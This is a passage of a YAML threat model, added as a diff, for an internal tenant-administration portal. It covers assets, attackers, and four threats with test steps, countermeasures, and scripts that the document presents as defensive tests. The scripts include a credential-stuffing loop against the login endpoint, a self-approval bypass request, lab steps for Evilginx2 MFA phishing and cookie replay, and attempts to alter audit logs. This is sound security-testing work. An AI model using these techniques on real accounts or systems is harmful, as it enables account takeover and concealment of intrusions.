@@ -1,0 +1,1496 @@
+meta:
+  title: "SignalCaptureAI Control Center (V0)"
+  modelId: "TM-SCCV0-20260414"
+  version: "2.0"
+  scope: >
+    Internal operations portal used exclusively by SignalCaptureAI platform
+    administrators to provision, govern, and delete client tenants. Covers
+    WorkOS SSO admin authentication (separate audience, MFA enforced),
+    two-person integrity via @signalcaptureai/approval-engine (Initiator +
+    Verifier, self-approval blocked), 5-step async provisioning pipeline
+    (Terraform OIDC, WorkOS org creation, Magic Link invitation via
+    invitation-engine, welcome email via ACS, audit receipt via
+    signalcaptureai-audit-service), CosmosDB PostgreSQL (Citus) with RLS
+    and tenant_id sharding, Azure Key Vault envelope encryption, immutable
+    7-year audit trail (year-partitioned, append-only DB trigger), and tenant
+    lifecycle operations (create, modify limits, soft/hard delete with dual
+    justification). EU-only region (Azure West Europe / North Europe).
+  owner: "Security Team"
+  lastUpdated: "2026-04-14"
+
+diagrams:
+  - id: "DIAGRAM_01"
+    title: "Control Center End-to-End Tenant Lifecycle Sequence"
+    file: "assets/ControlCenter_EndToEnd_Sequence.puml"
+    type: "sequence"
+    placement: "before_attack_tree"
+    description: >
+      Full end-to-end sequence from CC admin WorkOS SSO login through Initiator
+      request submission, @signalcaptureai/approval-engine Verifier approval,
+      5-step async provisioning pipeline (Terraform OIDC, WorkOS org, Magic Link
+      invitation, welcome email via ACS, audit receipt), and tenant deletion
+      execution including soft/hard-delete paths with dual justification.
+
+assets:
+  - ID: A_CC_APP
+    name: Control Center Application (Next.js 15 + signalcaptureai-cc-api)
+    type: Web Application
+    description: >
+      Internal operations web portal (signalcaptureai-control-center, Next.js 15,
+      port 3090) with dedicated API (signalcaptureai-cc-api, Fastify, port 3004)
+      exclusively accessible to SignalCaptureAI platform administrators. Provides
+      tenant creation, deletion, and limit modification workflows enforcing
+      two-person integrity via @signalcaptureai/approval-engine (Initiator cannot
+      self-approve). Emergency hard-delete requires dual written justifications.
+      All actions logged via @signalcaptureai/audit-client to the immutable
+      signalcaptureai-audit-service.
+    trustZone: Trusted Internal (High Privilege)
+    dataFlows:
+      - ID: DF-CC-AUTH
+        name: CC Admin Login Request
+        source: A_ADMIN
+        destination: A_CC_WORKOS
+        trustBoundary: 'false'
+        description: "Admin authenticates via WorkOS SSO (separate audience, MFA enforced)."
+      - ID: DF-CC-REQUEST
+        name: Tenant Lifecycle Request Submission
+        source: A_ADMIN
+        destination: A_CC_APP
+        trustBoundary: 'false'
+        description: "Initiator submits new tenant, deletion, or limit modification request to the CC application."
+
+  - ID: A_CC_WORKOS
+    name: WorkOS (CC Admin Authentication — Separate Audience)
+    type: External Identity Service
+    description: >
+      WorkOS SSO configured with a dedicated audience for Control Centre admin
+      authentication. Completely isolated from tenant-facing WorkOS applications.
+      Enforces MFA for all logins via WorkOS organisation-level policy. Issues
+      JWTs validated by auth-middleware via JWKS. Sessions stored in HTTP-only,
+      Secure, SameSite=Lax cookies. CC-specific roles (CC-Initiator, CC-Verifier,
+      CC-ReadOnly) enforced at the application layer.
+    trustZone: Edge / Third-Party
+    dataFlows:
+      - ID: DF-CC-JWT
+        name: CC Session Cookie Issuance
+        source: A_CC_WORKOS
+        destination: A_CC_APP
+        trustBoundary: 'true'
+        description: "WorkOS issues a signed JWT in an HTTP-only cookie with CC role claims after successful MFA authentication."
+
+  - ID: A_ADMIN
+    name: Control Center Administrator (Human Actor)
+    type: Human Actor
+    description: >
+      SignalCaptureAI internal staff member holding CC-Initiator or CC-Verifier
+      role. Operates from a corporate device. May hold both roles but must never
+      self-approve their own requests. Two-person integrity enforced by
+      @signalcaptureai/approval-engine at the data layer — not UI-only.
+    trustZone: High-Privilege Internal
+    dataFlows:
+      - ID: DF-ADMIN-VERIFY
+        name: Verifier Approval or Rejection
+        source: A_ADMIN
+        destination: A_CC_APP
+        trustBoundary: 'false'
+        description: "Verifier reviews pending lifecycle request and submits approve or reject decision."
+
+  - ID: A_AUDIT
+    name: Immutable Audit Service (signalcaptureai-audit-service)
+    type: Internal Service
+    description: >
+      signalcaptureai-audit-service (port 3005) provides an immutable, append-only
+      audit trail with 7-year retention. Backed by PostgreSQL with year-partitioned
+      audit_entries table and database trigger enforcing append-only semantics
+      (UPDATE and DELETE blocked at DB level). @signalcaptureai/audit-client
+      provides a typed SDK for all CC actions. All Control Center lifecycle actions,
+      approvals, rejections, and pipeline executions are recorded with Initiator
+      identity, Verifier identity, timestamp (UTC), action type, target tenant,
+      and outcome. Events also forwarded to Azure Monitor Log Analytics.
+    trustZone: Trusted Internal
+    dataFlows:
+      - ID: DF-AUDIT-WRITE
+        name: Audit Log Write
+        source: A_CC_APP
+        destination: A_AUDIT
+        trustBoundary: 'false'
+        description: "CC application writes structured audit events on every lifecycle action and decision."
+      - ID: DF-AUDIT-READ
+        name: Audit Log Export / Viewer
+        source: A_AUDIT
+        destination: A_CC_APP
+        trustBoundary: 'false'
+        description: "CC-ReadOnly and above can read and export audit log entries via the dashboard viewer."
+
+  - ID: A_PIPELINE
+    name: Provisioning Pipeline (5-Step Async + GitHub Actions CI/CD)
+    type: Infrastructure Component
+    description: >
+      signalcaptureai-provisioning-pipeline (port 3006) executes a 5-step async
+      tenant setup workflow triggered by the Control Center on Verifier approval:
+      (1) Terraform apply via OIDC Workload Identity Federation (zero stored
+      credentials); (2) WorkOS organisation creation; (3) Magic Link invitation
+      via @signalcaptureai/invitation-engine with seat-limit enforcement;
+      (4) welcome email via signalcaptureai-email-service (ACS);
+      (5) audit receipt via signalcaptureai-audit-service. GitHub Actions CI/CD
+      with data-destructive plan blocker prevents accidental database deletion.
+      Terraform state in encrypted Azure Blob Storage with lease-based locking.
+    trustZone: Privileged Internal
+    dataFlows:
+      - ID: DF-PIPELINE-TRIGGER
+        name: Pipeline Trigger from CC
+        source: A_CC_APP
+        destination: A_PIPELINE
+        trustBoundary: 'false'
+        description: "CC application triggers the CI/CD pipeline after Verifier approval, passing tenant parameters."
+      - ID: DF-TERRAFORM-EXECUTE
+        name: Terraform Provisioning Actions
+        source: A_PIPELINE
+        destination: A_AZURE
+        trustBoundary: 'false'
+        description: "Terraform executes privileged Azure API calls to provision or destroy tenant infrastructure."
+
+  - ID: A_AZURE
+    name: Azure Infrastructure, Key Vault & Container Apps
+    type: Cloud Infrastructure
+    description: >
+      Azure cloud resources: CosmosDB PostgreSQL (Citus) Elastic Cluster in EU
+      region with tenant_id sharding and RLS, Azure Key Vault with TDE keys and
+      envelope encryption keys for OAuth tokens, Azure Container Apps hosting 9
+      microservices with auto-scaling and scale-to-zero. Key Vault access
+      controlled via Azure Managed Identity.
+    trustZone: Trusted Internal
+    dataFlows:
+      - ID: DF-AZURE-DB
+        name: Tenant CosmosDB PostgreSQL (Citus) Provisioning
+        source: A_PIPELINE
+        destination: A_AZURE
+        trustBoundary: 'false'
+        description: "Terraform provisions Citus tenant_id sharding + RLS policies in EU region."
+      - ID: DF-AZURE-KV
+        name: Key Vault TDE Key Provisioning
+        source: A_PIPELINE
+        destination: A_AZURE
+        trustBoundary: 'false'
+        description: "Terraform provisions a tenant-specific TDE encryption key in Azure Key Vault."
+
+  - ID: A_TENANT_IDP
+    name: WorkOS (Tenant Authentication — SSO)
+    type: External Identity Service
+    description: >
+      WorkOS organisation provisioned per client tenant for end-user SSO
+      authentication with Magic Link invitations. Provisioned and deprovisioned
+      via the provisioning pipeline. Isolated from the CC Admin WorkOS audience.
+    trustZone: Edge / Third-Party
+    dataFlows:
+      - ID: DF-TENANT-IDP-PROVISION
+        name: Tenant WorkOS Organisation Provisioning
+        source: A_PIPELINE
+        destination: A_TENANT_IDP
+        trustBoundary: 'true'
+        description: "Provisioning pipeline creates or destroys the tenant WorkOS organisation."
+
+  - ID: A_EMAIL
+    name: Email Service (signalcaptureai-email-service + ACS)
+    type: Internal / External Service
+    description: >
+      signalcaptureai-email-service (port 3003) dispatches system emails via
+      Azure Communication Services: welcome emails (MJML templates via
+      @signalcaptureai/email-templates), Magic Link invitations, and alert
+      notifications. CRLF header sanitization prevents email injection.
+    trustZone: Trusted Internal / External
+    dataFlows:
+      - ID: DF-EMAIL-WELCOME
+        name: Welcome Email & Magic Link Dispatch
+        source: A_PIPELINE
+        destination: A_EMAIL
+        trustBoundary: 'true'
+        description: "Pipeline triggers welcome email and Magic Link invitation via signalcaptureai-email-service after successful provisioning."
+
+attackers:
+  - REFID: ATT_EXTERNAL
+    name: External Network Attacker
+    description: >
+      Unauthenticated attacker targeting the Control Center login endpoint from the internet.
+      Techniques include credential stuffing against the WorkOS CC admin endpoint, phishing of
+      admin credentials, and brute-forcing the MFA flow.
+    motivation: >
+      Gain admin access to provision rogue tenants, exfiltrate the audit log, or trigger
+      mass tenant deletion for ransom or competitive sabotage.
+    capability: Medium
+
+  - REFID: ATT_INSIDER
+    name: Malicious Insider (CC Administrator)
+    description: >
+      A current or recently terminated SignalCaptureAI employee holding CC-Initiator or
+      CC-Verifier credentials. Has legitimate platform access and detailed knowledge of the
+      provisioning and deletion workflows.
+    motivation: >
+      Financial gain via rogue tenant creation, sabotage via mass tenant deletion, exfiltration
+      of all client metadata from the tenant registry, or covering tracks by tampering with audit logs.
+    capability: High
+
+  - REFID: ATT_COLLUDING_ADMINS
+    name: Colluding Admin Pair
+    description: >
+      Two Control Center administrators who collude to bypass the two-person integrity control —
+      one acting as Initiator and a willing accomplice acting as Verifier — to approve a
+      malicious lifecycle action that neither should be able to approve alone.
+    motivation: >
+      Execute an unauthorized tenant deletion, exfiltrate a tenant's provisioning details,
+      or provision a rogue tenant without legitimate business justification.
+    capability: High
+
+  - REFID: ATT_SUPPLY_CHAIN
+    name: Supply Chain / CI/CD Compromise
+    description: >
+      An attacker who compromises the CI/CD pipeline toolchain (e.g., injected Terraform provider,
+      compromised pipeline credentials, or a malicious IaC module dependency) to hijack privileged
+      Azure cloud operations that run with administrative service principal credentials.
+    motivation: >
+      Mass infrastructure destruction, exfiltration of all tenant TDE keys from Key Vault,
+      or silent rogue resource provisioning in the cloud environment.
+    capability: Medium
+
+  - REFID: ATT_PHISHING
+    name: Targeted Phishing / Social Engineering Actor
+    description: >
+      A sophisticated attacker conducting spear-phishing campaigns specifically targeting
+      SignalCaptureAI administrators to harvest WorkOS CC credentials or MFA bypass tokens.
+      May impersonate the platform's own internal notification system.
+    motivation: >
+      Credential theft to gain authenticated CC access, enabling full tenant lifecycle
+      control under a legitimate admin identity.
+    capability: Medium
+
+securityObjectives:
+  - ID: SO-CONF
+    name: Confidentiality
+    description: >
+      Tenant configuration metadata, provisioning parameters, audit logs, and pipeline
+      credentials are accessible only to explicitly authorized Control Center administrators
+      with the appropriate role. No unauthorized external or cross-role disclosure is permitted.
+    category: CIA
+
+  - ID: SO-INT
+    name: Integrity
+    description: >
+      Tenant lifecycle state, provisioned infrastructure, platform configuration, and audit
+      records must accurately reflect authorized actions only. No unauthorized modification
+      of tenant limits, infrastructure state, or audit entries is permitted.
+    category: CIA
+
+  - ID: SO-AVAIL
+    name: Availability
+    description: >
+      The Control Center and its provisioning pipeline must remain available to support
+      tenant onboarding commitments and emergency deletion requests. Disruption of the CC
+      directly disrupts the business's ability to serve new and existing clients.
+    category: CIA
+
+  - ID: SO-AUTH
+    name: Authentication and Authorization
+    description: >
+      All Control Center access requires MFA-enforced authentication. Role-based access
+      controls (Initiator, Verifier, ReadOnly) are strictly enforced. The two-person
+      integrity rule — no admin may approve their own request — must be enforced at the
+      application layer, not only by policy.
+    category: Access Control
+
+  - ID: SO-AUDIT
+    name: Auditability and Non-Repudiation
+    description: >
+      Every lifecycle action, approval, rejection, and pipeline execution is recorded in an
+      immutable, append-only audit log with full attribution (admin identity, timestamp,
+      target tenant, outcome). No entry may be modified or deleted. The log must be
+      sufficient to reconstruct any incident or compliance investigation.
+    category: Governance
+
+  - ID: SO-COMPLIANCE
+    name: GDPR and Operational Compliance
+    description: >
+      All tenant data subject operations (provisioning, deletion, hard-delete) comply with
+      GDPR obligations. The 30-day soft-delete period satisfies retention obligations.
+      Cryptographically signed deletion receipts provide audit evidence. Emergency hard-delete
+      is subject to the highest authorization bar.
+    category: Governance
+
+threats:
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_001 — Credential Stuffing / Phishing: CC Admin Account Takeover
+  # Stage: CC Admin Login (WorkOS CC Organisation)
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_001_CC_ATO
+    title: "Control Center Admin Account Takeover via Credential Stuffing or Phishing"
+    threatType: "Spoofing"
+    attack: >
+      An attacker obtains a CC administrator's username and password through a credential
+      stuffing campaign (reusing leaked credentials from unrelated breaches) or a targeted
+      spear-phishing email impersonating SignalCaptureAI internal notifications. WorkOS
+      enforces MFA at the organisation level for the CC audience, but if the attacker
+      captures a real-time OTP via an adversary-in-the-middle phishing kit (e.g., Evilginx2),
+      they obtain a valid CC session cookie with Initiator or Verifier privileges.
+    impactDesc: >
+      Attacker gains full CC access. Can submit tenant deletion requests as Initiator, or
+      approve malicious requests as Verifier. With both roles compromised, full two-person
+      integrity bypass is possible. Every tenant provisioned on the platform is at risk of
+      malicious deletion, data exposure, or rogue infrastructure changes.
+    impactedSecObj:
+      - SO-AUTH
+      - SO-CONF
+      - SO-INT
+    attackers:
+      - ATT_EXTERNAL
+      - ATT_PHISHING
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"
+      score: 8.3
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "A test CC admin account in a non-production WorkOS CC organisation"
+      - "A list of known credential pairs from public breach datasets (e.g., haveibeenpwned)"
+      - "A credential stuffing tool (Burp Suite Intruder or custom script)"
+      - "An adversary-in-the-middle phishing framework for MFA bypass test (e.g., Evilginx2 in lab)"
+
+    testSteps:
+      - "Attempt login to the WorkOS CC endpoint with 10+ known-breached email/password pairs from haveibeenpwned"
+      - "Observe whether WorkOS rate-limits or challenges after repeated failed attempts"
+      - "Verify WorkOS enforces MFA — disable MFA on the test account and confirm the app rejects login"
+      - "Configure an Evilginx2 reverse proxy in lab against the WorkOS login page to test MFA phishing resilience"
+      - "Attempt login with a captured session cookie from the Evilginx2 relay — verify token lifetime and binding"
+      - "Verify WorkOS CC organisation has appropriate security policies enabled"
+      - "Confirm the CC application validates the JWT audience claim matches the CC audience — not any tenant audience"
+
+    testScripts:
+      - language: "python"
+        description: "Credential stuffing rate-limit validation against WorkOS CC login endpoint"
+        code: |
+          import requests
+          import time
+
+          # Replace with your WorkOS CC API key and organisation ID
+          WORKOS_API_KEY = "REPLACE_WITH_WORKOS_API_KEY"
+          WORKOS_ORG_ID = "REPLACE_WITH_CC_ORG_ID"
+          BASE_URL      = "https://api.workos.com"
+
+          test_pairs = [
+              ("admin@signalcaptureai.com", "password123"),
+              ("admin@signalcaptureai.com", "Summer2024!"),
+              ("admin@signalcaptureai.com", "SignalCapture1"),
+              ("admin@signalcaptureai.com", "qwerty123456"),
+              ("admin@signalcaptureai.com", "Welcome2025"),
+          ]
+
+          for email, pwd in test_pairs:
+              resp = requests.post(f"{BASE_URL}/user_management/authenticate", json={
+                  "email": email,
+                  "password": pwd,
+                  "client_id": WORKOS_ORG_ID,
+              }, headers={"Authorization": f"Bearer {WORKOS_API_KEY}"})
+              print(f"[{resp.status_code}] {email}:{pwd} — {resp.json().get('message','OK')}")
+              time.sleep(1)
+
+          print("\n[*] If any request above returned 200 or did NOT return 429 after 5 attempts,")
+          print("[!] rate-limiting or brute-force protection is not working correctly.")
+        requirements:
+          - "requests"
+
+    testTools:
+      - "Burp Suite Intruder (credential stuffing automation)"
+      - "Evilginx2 (AiTM MFA phishing — lab use only)"
+      - "HaveIBeenPwned API (credential exposure check)"
+      - "WorkOS Dashboard (monitor authentication events and security policies)"
+
+    expectedBehavior: >
+      Repeated failed login attempts are not rate-limited. WorkOS CC organisation allows
+      password-only login without MFA enforcement. A session cookie obtained via AiTM phishing
+      is valid across multiple IP addresses without re-challenge.
+
+    expectedMitigation: >
+      WorkOS CC organisation enforces MFA for every login with no bypass path. Brute-force
+      protection and breached password detection are enabled. Session cookies are HTTP-only,
+      bound to the original IP or require step-up re-authentication for high-privilege actions.
+      Alert fires on >3 failed login attempts per account within 5 minutes.
+
+    countermeasures:
+      - ID: CM_001_MFA_ENFORCE
+        title: "Enforce MFA at the WorkOS CC Organisation Level — No Bypass Path"
+        description: >
+          Configure the WorkOS CC organisation with a mandatory MFA policy using
+          phishing-resistant authenticators (TOTP or hardware key). Disable password-only
+          authentication at the organisation policy level, not merely by user preference.
+        status: "in_place"
+        effort: "Low"
+        why: >
+          MFA enforcement at the organisation level is the primary and cheapest control against
+          credential stuffing and phishing. If it is enforced only by user preference, admins
+          can disable it, nullifying the protection.
+        implementation:
+          - "In WorkOS Dashboard > Organisation Settings: set MFA policy to 'Required' for the CC organisation"
+          - "Disable the 'Remember this device' option for CC admin logins"
+          - "Enroll all CC admin accounts in TOTP (Google Authenticator / Authy) before the CC goes live"
+          - "Evaluate WebAuthn hardware key support (YubiKey) for V1 as a phishing-resistant upgrade"
+          - "Test that MFA cannot be bypassed via direct API authentication — enforce MFA on all login flows"
+          - "Create an automated alert: any successful CC login without MFA factor recorded triggers a P1 security alert"
+
+      - ID: CM_001_ATTACK_PROTECTION
+        title: "Enable WorkOS Security Policies — Brute Force and Account Lockout Protection"
+        description: >
+          Configure WorkOS organisation security policies to detect and block credential
+          stuffing campaigns before a valid password match is attempted.
+        status: "in_place"
+        effort: "Low"
+        why: >
+          WorkOS security policies provide rate-limiting and account lockout at the organisation
+          level at zero additional implementation cost. Without them, credential stuffing
+          can run undetected against the CC login endpoint.
+        implementation:
+          - "Configure WorkOS organisation security policies with brute-force protection enabled"
+          - "Set maximum failed attempts to 5 before account lockout"
+          - "Enable IP-based rate limiting for repeated failed authentication attempts"
+          - "Monitor WorkOS authentication events for suspicious patterns via webhook integration"
+          - "Set notification webhook for blocked accounts to the security team alerting pipeline"
+
+      - ID: CM_001_SESSION_BIND
+        title: "Bind CC Session Tokens to IP and Enforce Short Expiry"
+        description: >
+          Configure short-lived CC session cookies (15-minute expiry) and bind the session
+          to the originating IP address, requiring re-authentication on IP change.
+        status: "in_place"
+        effort: "Medium"
+        why: >
+          AiTM phishing attacks steal valid session cookies and replay them from a different IP.
+          IP binding and short expiry windows reduce the replay window and limit the blast radius
+          of a stolen session.
+        implementation:
+          - "Set WorkOS CC session cookie expiry to 900 seconds (15 minutes) via HTTP-only cookie TTL"
+          - "Set refresh token rotation to absolute expiry of 8 hours (maximum shift length)"
+          - "In CC application middleware: extract source IP at login, store in session, re-validate on each request"
+          - "On IP mismatch: invalidate session and force re-authentication"
+          - "Log all IP mismatch events as high-severity security events"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_002 — Self-Approval Bypass: Two-Person Integrity Circumvention
+  # Stage: Tenant Lifecycle Approval Workflow
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_002_SELF_APPROVE
+    title: "Two-Person Integrity Bypass via Self-Approval or Role Conflation"
+    threatType: "Elevation of Privilege"
+    attack: >
+      An Initiator with knowledge of the application's approval API submits a lifecycle
+      request and then attempts to approve it using the same authenticated session by
+      directly calling the approval endpoint — bypassing the UI's role-separation checks.
+      Alternatively, a single admin account is granted both Initiator and Verifier roles
+      by a misconfiguration, allowing them to self-approve within the normal workflow.
+      In either case, a single person can authorize a destructive tenant deletion without
+      a second independent confirmation.
+    impactDesc: >
+      A single compromised or malicious admin can authorize and execute tenant deletions,
+      rogue provisioning, or limit modifications without any peer oversight. The governance
+      control designed to prevent unilateral destructive action is completely nullified.
+    impactedSecObj:
+      - SO-AUTH
+      - SO-INT
+      - SO-AUDIT
+    attackers:
+      - ATT_INSIDER
+      - ATT_COLLUDING_ADMINS
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:H/A:H"
+      score: 8.2
+      severity: "High"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "A test CC admin account holding both CC-Initiator and CC-Verifier roles"
+      - "API documentation or browser DevTools showing the approval endpoint URL and request format"
+      - "A valid CC JWT for the Initiator account"
+
+    testSteps:
+      - "Authenticate as a CC-Initiator and submit a New Tenant Request — note the returned request ID"
+      - "Without logging out, attempt to call the approval endpoint directly: POST /api/approvals/{requestId}/approve"
+      - "Observe whether the server returns 403 because the approver matches the Initiator"
+      - "Create a test account assigned both CC-Initiator and CC-Verifier roles — submit and approve a request through the normal UI"
+      - "Verify the CC application prevents the same account from occupying both roles on the same request"
+      - "Check whether the approval endpoint validates the approver's identity against the original requester's identity"
+      - "Attempt to replay a previously captured approval JWT from Verifier B to approve a request from Initiator A"
+
+    testScripts:
+      - language: "bash"
+        description: "Direct API call to approve own request using Initiator JWT — should return 403"
+        code: |
+          #!/bin/bash
+          # Usage: ./test_self_approve.sh <CC_BASE_URL> <INITIATOR_JWT> <REQUEST_ID>
+          CC_URL="$1"
+          JWT="$2"
+          REQUEST_ID="$3"
+
+          echo "[*] Attempting self-approval of request $REQUEST_ID using Initiator JWT..."
+          RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST "$CC_URL/api/approvals/$REQUEST_ID/approve" \
+            -H "Authorization: Bearer $JWT" \
+            -H "Content-Type: application/json" \
+            -d '{"decision":"approved","comment":"Test self-approval"}')
+
+          if [ "$RESPONSE" -eq 403 ]; then
+            echo "[PASS] Server returned 403 — self-approval is blocked."
+          elif [ "$RESPONSE" -eq 200 ]; then
+            echo "[FAIL] Server returned 200 — self-approval SUCCEEDED. Two-person integrity is broken!"
+          else
+            echo "[UNKNOWN] Server returned HTTP $RESPONSE"
+          fi
+        requirements:
+          - "curl"
+
+    testTools:
+      - "Burp Suite (intercept and replay approval API calls)"
+      - "Postman (craft direct API requests with different JWT configurations)"
+      - "WorkOS Dashboard (verify role assignments are mutually exclusive per request)"
+
+    expectedBehavior: >
+      The approval endpoint accepts the Initiator's JWT as valid authorization for the
+      approval action because the JWT contains the Verifier role claim. The server does not
+      compare the approver identity against the original requester identity stored when the
+      request was registered.
+
+    expectedMitigation: >
+      The approval endpoint server-side checks that the authenticated user's subject (sub claim)
+      does not match the requester's subject stored in the pending request record. The check returns
+      403 with a specific error code and an audit log entry regardless of what roles the JWT contains.
+
+    countermeasures:
+      - ID: CM_002_REQUESTER_LOCK
+        title: "Enforce Server-Side Requester-Approver Identity Separation on Every Approval"
+        description: >
+          When a lifecycle request is registered, the requesting admin's user ID (WorkOS sub claim)
+          is stored in the pending request record. The approval endpoint compares the approving
+          admin's sub claim against the stored requester sub claim and rejects any match with 403.
+        status: "in_place"
+        effort: "Medium"
+        why: >
+          UI-only separation is trivially bypassed via direct API calls. The separation must be
+          enforced at the data layer on every approval request, making it impossible to circumvent
+          regardless of what roles or tokens the admin possesses.
+        implementation:
+          - "In the approval request record schema, add fields: requester_sub (WorkOS user ID), requester_email"
+          - "On approval endpoint handler: extract approver_sub from the validated JWT"
+          - "Compare approver_sub == requester_sub — if match, return 403 with error code SELF_APPROVAL_BLOCKED"
+          - "Write a SELF_APPROVAL_ATTEMPT audit log entry regardless of outcome"
+          - "Add integration test: submit request as User A, attempt approval as User A — assert 403"
+          - "Add integration test: submit request as User A, approve as User B — assert 200"
+
+      - ID: CM_002_ROLE_AUDIT
+        title: "Alert on Admin Accounts Holding Both Initiator and Verifier Roles Simultaneously"
+        description: >
+          Emit a security alert whenever an admin account is assigned both CC-Initiator and
+          CC-Verifier roles at the same time. Role assignment changes are logged and reviewed.
+        status: "in_place"
+        effort: "Low"
+        why: >
+          Even if server-side identity separation is enforced, a dual-role account is a standing
+          misconfiguration risk. Alerting on this condition ensures the security team is aware
+          of any role assignment that weakens the two-person integrity posture.
+        implementation:
+          - "Add a nightly WorkOS API check: query all CC admin users and flag any with both CC-Initiator and CC-Verifier roles"
+          - "Emit a high-priority alert to the security team distribution list for any flagged accounts"
+          - "Log all role assignment changes in the audit log with the assigning admin's identity"
+          - "In WorkOS Dashboard, document the CC organisation dual-role prohibition policy"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_003 — Audit Log Tampering: Post-Incident Cover-Up
+  # Stage: Audit Engine
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_003_AUDIT_TAMPER
+    title: "Audit Log Tampering to Conceal Unauthorized Lifecycle Actions"
+    threatType: "Tampering"
+    attack: >
+      A malicious insider or attacker with elevated Azure access attempts to modify or
+      delete audit log entries after performing an unauthorized action (e.g., a rogue
+      tenant deletion or self-approval). If the audit storage backend uses a mutable
+      Azure SQL table or blob storage without write-protection, a direct database query
+      or storage API call can overwrite or delete records. Alternatively, an attacker
+      disables the audit writing pipeline before performing the malicious action so no
+      record is ever written.
+    impactDesc: >
+      Unauthorized actions become forensically invisible. GDPR Article 5 accountability
+      obligations cannot be met. Incident investigation fails. Cryptographically signed
+      deletion receipts are absent or falsified, creating legal exposure. Regulatory audits
+      produce inconclusive results.
+    impactedSecObj:
+      - SO-AUDIT
+      - SO-COMPLIANCE
+      - SO-INT
+    attackers:
+      - ATT_INSIDER
+      - ATT_COLLUDING_ADMINS
+    CVSS:
+      vector: "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:L"
+      score: 6.6
+      severity: "Medium"
+    fullyMitigated: false
+    alwaysPresent: false
+
+    testPrerequisites:
+      - "Direct access to the audit log storage backend (Azure SQL or Azure Storage)"
+      - "Azure portal credentials or service principal with write access to the audit storage resource"
+      - "An existing audit log entry to attempt modification"
+
+    testSteps:
+      - "Identify the audit log storage resource type (Azure SQL table, Cosmos DB, Azure Blob, or other)"
+      - "Attempt a direct UPDATE/DELETE SQL statement against a known audit log entry ID"
+      - "Verify the attempt is rejected by the storage access control policy"
+      - "Attempt to call the Azure Storage API to overwrite an audit blob with a modified version"
+      - "Verify the blob has immutability policies (WORM) that reject overwrite requests"
+      - "Disable or throttle the audit writing pipeline and perform a CC lifecycle action — verify whether an audit entry is still written"
+      - "Check Azure Monitor: does it alert when no audit write is observed within an expected window?"
+
+    testTools:
+      - "Azure CLI (az storage blob update — test immutability rejection)"
+      - "Azure SQL Query Editor (direct SQL modification attempt)"
+      - "Azure Monitor / Log Analytics (verify alerting on audit gap)"
+
+    expectedBehavior: >
+      Audit records stored in a mutable Azure SQL table can be updated or deleted by any
+      identity with database write access. The audit writing pipeline can be disabled by
+      a pipeline administrator without triggering any alert.
+
+    expectedMitigation: >
+      Audit records are stored with Azure Blob Storage WORM (Write Once Read Many) immutability
+      policy. Once written, no record can be modified or deleted before the retention period expires.
+      Azure Monitor alerts on any gap in the expected audit write cadence. All audit storage
+      access attempts are themselves logged in Azure Activity Log.
+
+    countermeasures:
+      - ID: CM_003_WORM_AUDIT
+        title: "Store Audit Log in Append-Only WORM Blob Storage with Time-Based Retention Lock"
+        description: >
+          Write audit log entries to Azure Blob Storage configured with an immutable storage
+          policy (time-based retention lock, compliance mode). Once locked, no principal —
+          including subscription owners — can modify or delete entries before the retention
+          period expires.
+        status: "in_place"
+        effort: "Medium"
+        why: >
+          An append-only SQL table can be modified by anyone with database access. Only
+          Azure Blob WORM with compliance-mode locking provides a storage-level guarantee
+          that no principal — not even administrators — can modify records.
+        implementation:
+          - "Create a dedicated Azure Storage Account for audit logs in the EU region"
+          - "Enable 'Immutable blob storage' with a time-based retention policy of 7 years (2555 days)"
+          - "Set the policy to 'Locked' after initial validation — compliance mode prevents even admins from removing it"
+          - "Write audit entries as individual JSON blobs (one per event) with a structured naming convention: {tenant_id}/{date}/{event_id}.json"
+          - "Restrict the storage account RBAC: audit write service identity gets 'Storage Blob Data Contributor'; no other identity gets write access"
+          - "Test: attempt to delete or overwrite a blob using the Azure portal — confirm rejection with 409 ImmutablePolicy error"
+
+      - ID: CM_003_AUDIT_ALERT
+        title: "Alert on Audit Pipeline Silence — Detect Disabled Logging Before Actions Execute"
+        description: >
+          Configure Azure Monitor to alert if the expected audit log write rate drops to zero
+          for more than 5 minutes during CC operating hours.
+        status: "not_started"
+        effort: "Low"
+        why: >
+          A sophisticated insider can disable the audit pipeline before taking action. An alert
+          on unexpected silence in the audit stream detects this before or during the malicious
+          window, not only in post-incident review.
+        implementation:
+          - "In Azure Monitor, create a metric alert on the audit storage account: 'Blob write operations per 5 minutes < 1 during business hours'"
+          - "Route the alert to the security team PagerDuty or email distribution list as a P2 incident"
+          - "Create a synthetic heartbeat log entry written every 5 minutes by the CC application to maintain a baseline write signal"
+          - "Verify the alert fires correctly by temporarily stopping the audit write service in a test environment"
+
+  # ─────────────────────────────────────────────────────────────────────────────
+  # T_004 — Terraform Credential Compromise: Mass Infrastructure Takeover
+  # Stage: CI/CD Pipeline / Terraform Execution
+  # ─────────────────────────────────────────────────────────────────────────────
+  - ID: T_004_TF_CRED_THEFT
+    title: "Terraform Service Principal Credential Theft Enabling Mass Infrastructure Control"
+    threatType: "Elevation of Privilege"
+    attack: >
+      The CI/CD pipeline executes Terraform with a privileged Azure service principal that
+      has permissions to provision and destroy CosmosDB databases, Key Vault keys, and WorkOS organisations
+      across all tenants. If the CI/CD pipeline uses static credentials (service principal secrets)
+      stored as plaintext environment variables, hardcoded in Terraform state files, or in
+      unprotected CI/CD pipeline secrets, an attacker who compromises the pipeline (via injected
+      dependency, misconfigured CI runner, or insider access) can extract the credentials and
+      execute arbitrary Azure API calls — including destroying all tenant infrastructure simultaneously.
+    impactDesc: >
+      Complete loss of all tenant infrastructure. All tenant CosmosDB databases purged. All TDE keys
+      invalidated — data irrecoverable. All WorkOS tenant organisations destroyed. A mass deletion
+      event that would end the business entirely and trigger regulatory and contractual liability
+      across every client simultaneously.
+    impactedSecObj:
